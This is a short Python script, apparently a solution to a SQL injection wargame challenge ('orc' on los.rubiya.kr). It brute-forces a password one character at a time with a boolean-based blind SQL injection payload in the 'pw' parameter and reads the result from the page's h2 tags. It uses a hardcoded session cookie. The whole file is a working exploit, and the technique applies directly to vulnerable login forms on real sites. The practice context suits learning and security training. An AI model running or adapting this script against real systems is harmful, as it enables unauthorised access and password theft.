#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
import time

"""
__AUTHOR__ : revi1337
__DATE__ : 2022-11-15

Boolean Based SQL Injection Exploit Code
"""

def main(): 
	url = r"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
	haeders = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"}
	cookies = {"PHPSESSID": "t8eftn5in6ef6mdc4majk4rh8e"}

	credentials = []
	for v in range(1,31):
		cnt = 0
		with requests.Session() as session:
			for i in range(33,127):
				payloads = {"pw": "' or ascii(substr(pw,{},1)) = {} #".format(v, i)}
				res = session.get(url = url, headers = haeders, cookies = cookies, params = payloads).text
				res = BeautifulSoup(res, 'lxml').findAll('h2')
				if res:
					print("[!] Find {}th Value : {} ".format(v, chr(i)))
					credentials.append(chr(i))
					break
				elif not res:
					cnt += 1

		if cnt == len(range(33,127)):
			break

	print()
	print("[+] Task Done! Final Password : {}".format("".join(credentials)))

if __name__ == '__main__':
	start_time = time.perf_counter()
	main()
	end_time = time.perf_counter()
	print()
	print("[*] Total Time : {}".format(end_time - start_time))




